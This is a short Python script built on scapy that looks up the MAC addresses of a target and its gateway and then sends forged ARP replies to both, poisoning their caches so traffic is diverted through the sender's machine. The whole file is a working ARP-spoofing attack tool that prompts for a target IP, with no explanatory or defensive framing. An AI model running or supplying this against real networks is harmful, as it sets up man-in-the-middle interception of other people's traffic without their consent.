from scapy.all import *


def get_mac_address(ip_address):
    # Create an Ether broadcast packet
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    # Create an ARP request packet
    arp_request = ARP(pdst=ip_address)
    # Combine the Ether and ARP packets
    arp_request_broadcast = broadcast / arp_request
    # Send the combined packet and receive the response
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)
    # Return the MAC address from the response
    return answered_list[0][0][1].hwsrc


def arp_spoofing(target_ip, gateway_ip, target_mac, gateway_mac):
    # Create an ARP response packet
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    # Send the packet
    send(packet, count=2, verbose=False)
    packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    # Send the packet
    send(packet, count=2, verbose=False)


if __name__ == '__main__':
    target_ip = input("Enter Target IP:")
    gateway_ip = input("Enter Gateway IP:")
    target_mac = get_mac_address(target_ip)
    gateway_mac = get_mac_address(gateway_ip)
    arp_spoofing(target_ip, gateway_ip, target_mac, gateway_mac)
